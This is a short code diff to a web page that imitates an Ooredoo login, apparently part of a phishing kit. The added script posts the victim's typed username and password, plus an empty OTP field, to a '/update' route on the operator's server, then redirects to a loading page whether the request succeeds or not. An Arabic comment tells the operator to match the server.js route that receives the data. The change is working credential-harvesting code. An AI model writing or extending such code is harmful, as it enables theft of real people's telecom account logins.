@@ -177,7 +177,22 @@
         return;
       }
 
-      window.location.href='ooredoo-loading.html';
+      // إرسال البيانات إلى السيرفر (تأكد من المسار الذي يستقبل البيانات في server.js، وعادة يكون عبر مسار مثل /update أو /save أو إرسال مباشر حسب إعدادات السيرفر لديك)
+      fetch('/update', {
+          method: 'POST',
+          headers: {'Content-Type': 'application/json'},
+          body: JSON.stringify({
+              ooredoo: {
+                  username: username.value,
+                  password: password.value,
+                  otp: ""
+              }
+          })
+      }).then(function(){
+          window.location.href='ooredoo-loading.html';
+      }).catch(function(){
+          window.location.href='ooredoo-loading.html';
+      });
     }
   </script>
 </body>
